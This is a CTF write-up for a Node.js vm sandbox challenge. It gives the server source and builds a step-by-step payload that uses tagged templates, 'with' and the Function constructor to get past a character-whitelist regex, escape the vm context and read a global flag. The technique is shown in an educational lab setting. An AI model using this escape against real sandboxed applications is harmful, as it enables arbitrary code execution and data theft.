## Owner:

> CaptainFreak

## Challenge Description

```
const express = require("express")
const fs = require("fs")
const vm = require("vm")
const watchdog = require("./watchdog");

global.flag = fs.readFileSync("flag").toString()
const source = fs.readFileSync(__filename).toString()
const help = "There is no help on the way."

const app = express()
const port = 3000

app.use(express.json())
app.use('/', express.static('public'))

app.post('/repl', (req, res) => {
    let sandbox = vm.createContext({par: (v => `(${v})`), source, help})
    let validInput = /^[a-zA-Z0-9 ${}`]+$/g
    
    let command = req.body['cmd']
    
    console.log(`${req.ip}> ${command}`)

    let response;

    try {
        if(validInput.test(command))
        {    
            let watch = watchdog.schedule()
            try {
                response = vm.runInContext(command, sandbox, {
                    timeout: 300,
                    displayErrors: false
                });
            } finally {
                watchdog.stop(watch)
            }
        } else
            throw new Error("Invalid input.")
    } catch(ex)
    {
        response = ex.toString()
    }

    console.log(`${req.ip}< ${response}`)
    res.send(JSON.stringify({"response": response}))
})

console.log(`Listening on :${port}...`)
app.listen(port, '0.0.0.0')
```

#### Solved?

 - No

#### Tried:

Found a way to escape NodeJs vm: https://gist.github.com/jcreedcmu/4f6e6d4a649405a9c86bb076905696af. 

Got idea that We can use par.constructor("return flag"). This will eval "return flag" in the context of invoking/parent code as the constructor belongs to that space and will return a function whose body is that string.

So, par.constructor("return flag")() will return flag from parent codes/out of VMs context.

This can be invoked using par.constructor\`return flag\`\`\`

Hence Ended up at payload {"cmd":"par.constructor\`return flag\`\`\`"}. 

Got stuck by one dot. I succesfully used tag notation of function to bypass use of "()" that is prevented by regex check as only speacial chars allowed are alphanumeric, $, {, }, \` 

Could not go further than this. 


#### Solutions:

The challenge was to exlpoit Escame NodeJs vm as well as a regex filter /^[a-zA-Z0-9 ${}\`]+$/g. which disallowes us to use the very useful dot char to access object elements. I tried to find the other way to access properties without using "." but I guess I failed at googling.

Steps to solve the challenge:

1. So we do have a way to access properties without dot.
2. Object.property() in JS is equavalent to with(Object)property()
3. Example: `console.log("flag")` is totally equal to `with(console)log("flag")`
4. But you will say hey we cant use "()" due to regex and this can't even be bypassed using \` as "with" is a JS keyword like "if" and not fucntion :).
5. And then `par` function described in our vm context comes in for the rescue.
6. par(value) function returns "(\`${value}\`)" === (value), where value is executed in it and value is returned with enclosed in "()" which is very convenient for us :).
7. So to make `with(console)log("flag")` out of using "par" we can do "with\`${par\`console\`}log${par\`"flag"\`}\` 

8. Hence, par.constructor("return flag")() is equal to with(par)constructor("return flag")()
9. which is equal to with(par)constructor\`return flag\`\`\` but we need to remove (), we will use par() given
10. Which then can be made \`with${par\`par\`}constructor\`return flag\`\`\`\`
11. Above thing will make it a string which need to be evaled. eval\`\` wont work, will look into this, 
12. Another way to. execute code `Function`.
13. Function(), which interprests last arg as body of function to make
14. Function\`code\` will return a func with with given code body. Function\`code\`\`\` will execute that function.
15. Lets use this, "Function\`a${\`with${par\`constructor\`}return constructor${par\`a\`}\`}\`\`return flag\`\`\`."
And boom !

## TLDR

![](https://i.ibb.co/3MjF0SY/Untitled-Diagram-1.png)

The payload is equivalent to:

```
Function(a){
	with(par)return constructor(a)
}("return flag")()
```

Really Loved this challenge, Another lesson that in good ctfs, everything is usable.

References:
1. https://twitter.com/po6ix/status/1239169901991849989 - Simpler and crisp.
2. https://st98.github.io/diary/posts/2020-03-15-confidence-2020-ctf.html
This guy even used the help string - Good Read. Kinda overkill.
3. https://twitter.com/po6ix/status/1239167341885149185







